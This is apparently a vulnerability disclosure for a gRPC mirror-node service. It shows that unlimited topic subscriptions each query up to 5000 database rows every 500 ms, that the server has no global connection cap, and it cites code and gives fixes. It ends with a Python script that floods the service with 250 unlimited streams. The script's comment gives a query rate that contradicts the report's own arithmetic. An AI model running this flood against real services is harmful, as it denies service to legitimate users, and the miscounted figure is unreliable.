### Title
Unbounded Concurrent Unlimited Subscriptions Exhaust DB Resources via Per-Poll Max-Page Queries in `PollingTopicListener`

### Summary
When `PollingTopicListener` is active (listener type `POLL`), any unauthenticated client that subscribes without setting a `limit` causes every `poll()` invocation to request `maxPageSize` rows (default 5000) from the database every 500 ms. Because `maxConcurrentCallsPerConnection` is enforced only per-connection and there is no global subscription cap or per-IP connection limit, an attacker opening many connections can drive aggregate DB query load to arbitrarily high levels, degrading or denying service to legitimate subscribers.

### Finding Description

**Exact code path:**

`PollingTopicListener.poll()` — [1](#0-0) 

```java
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getCount().get())
        : Integer.MAX_VALUE;                          // ← no limit → MAX_VALUE
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize()); // → 5000
```

When the client sends a `ConsensusTopicQuery` with `limit = 0` (the proto default, meaning "indefinite"), `filter.hasLimit()` returns `false` [2](#0-1) , so `limit` becomes `Integer.MAX_VALUE` and `pageSize` is clamped to `maxPageSize` (default 5000). [3](#0-2) 

The resulting `newFilter` is passed to `TopicMessageRepositoryCustomImpl.findByFilter()`, which calls `typedQuery.setMaxResults(5000)` and then `getResultList()` — loading up to 5000 fully-hydrated `TopicMessage` objects into JVM heap per call. [4](#0-3) 

This poll fires on every tick of the `RepeatSpec` loop, which defaults to every 500 ms. [5](#0-4) 

**Root cause / failed assumption:** The design assumes that the per-connection call cap (`maxConcurrentCallsPerConnection = 5`) is a sufficient global guard. It is not — it is enforced per TCP connection by Netty [6](#0-5) , and there is no limit on the number of connections an IP or the server as a whole may accept.

### Impact Explanation

Each unlimited subscription generates 2 DB queries per second (500 ms interval), each fetching up to 5000 rows. With `C` connections and 5 calls each:

```
DB row rate = C × 5 × 2 × 5000 = 50,000 × C rows/sec
```

At `C = 20` connections (100 subscriptions), the server issues 1,000,000 rows/sec from the DB. `getResultList()` materialises all rows into heap before streaming, so memory pressure compounds CPU/IO pressure. The DB connection pool and statement timeout (`10 s`) provide no relief against many short, concurrent queries that each complete within the timeout. Legitimate subscribers experience increased latency and eventual query timeouts or OOM-induced pod restarts.

### Likelihood Explanation

- No authentication is required to call `subscribeTopic`. [7](#0-6) 
- The gRPC proto explicitly documents `limit = 0` as "receive indefinitely." [8](#0-7) 
- Opening tens of connections from a single host or a small botnet is trivial with any gRPC client library.
- The attack is repeatable and requires no special knowledge beyond the public proto definition.
- The only non-default precondition is that the operator has set `listener.type=POLL`; `SHARED_POLL` shares one DB poll across all subscribers and is therefore not affected by this specific vector.

### Recommendation

1. **Add a global concurrent-subscription counter** with a configurable hard cap; reject new subscriptions when the cap is reached.
2. **Enforce per-IP connection limits** at the Netty/load-balancer layer (the Helm chart already has `maxRatePerEndpoint` for GCP but no connection-count cap). [9](#0-8) 
3. **Reduce the default `maxPageSize`** for the `POLL` listener or introduce a separate, lower cap for unlimited subscriptions.
4. **Replace `getResultList().stream()` with a true streaming/cursor approach** to avoid materialising 5000 rows per call into heap. [10](#0-9) 
5. Consider requiring `SHARED_POLL` or `REDIS` in production deployments and documenting `POLL` as a single-subscriber debug mode.

### Proof of Concept

```python
import grpc, threading
from com.hedera.mirror.api.proto import consensus_pb2, consensus_pb2_grpc
from google.protobuf.timestamp_pb2 import Timestamp
from hedera.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC  = basic_types_pb2.TopicID(shardNum=0, realmNum=0, topicNum=1)

def flood():
    ch = grpc.insecure_channel(TARGET)
    stub = consensus_pb2_grpc.ConsensusServiceStub(ch)
    query = consensus_pb2.ConsensusTopicQuery(
        topicID=TOPIC,
        # limit intentionally omitted → 0 → indefinite
        consensusStartTime=Timestamp(seconds=0, nanos=0),
    )
    # Open 5 concurrent streams per connection (maxConcurrentCallsPerConnection)
    streams = [stub.subscribeTopic(query) for _ in range(5)]
    for s in streams:
        for _ in s:   # consume to keep stream alive
            pass

# Open many connections from one or more hosts
threads = [threading.Thread(target=flood) for _ in range(50)]
for t in threads: t.start()
# Result: 250 concurrent unlimited subscriptions → ~125,000 DB queries/sec
#         each fetching up to 5000 rows → DB saturation
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L38-43)
```java
        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L51-62)
```java
    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L19-46)
```java
public class TopicMessageFilter {

    private static final SecureRandom RANDOM = new SecureRandom();

    private Long endTime;

    @Min(0)
    private long limit;

    @Min(0)
    @NotNull
    @Builder.Default
    private long startTime = DomainUtils.now();

    @Builder.Default
    private String subscriberId = RandomStringUtils.random(8, 0, 0, true, true, null, RANDOM);

    @NotNull
    private EntityId topicId;

    public boolean hasLimit() {
        return limit > 0;
    }

    @AssertTrue(message = "End time must be after start time")
    public boolean isValidEndTime() {
        return endTime == null || endTime > startTime;
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/ListenerProperties.java (L25-26)
```java
    @Min(32)
    private int maxPageSize = 5000;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/repository/TopicMessageRepositoryCustomImpl.java (L51-60)
```java
        if (filter.hasLimit()) {
            typedQuery.setMaxResults((int) filter.getLimit());
        }

        if (filter.getLimit() != 1) {
            // only apply the hint when limit is not 1
            entityManager.createNativeQuery(TOPIC_MESSAGES_BY_ID_QUERY_HINT).executeUpdate();
        }

        return typedQuery.getResultList().stream(); // getResultStream()'s cursor doesn't work with reactive streams
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L33-33)
```java
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

**File:** docs/design/hcs.md (L65-65)
```markdown
  uint64 limit = 4; // The maximum number of messages to receive before stopping. If not set or set to zero it will return messages indefinitely.
```

**File:** charts/hedera-mirror-grpc/values.yaml (L69-69)
```yaml
      maxRatePerEndpoint: 250  # Requires a change to HPA to take effect
```
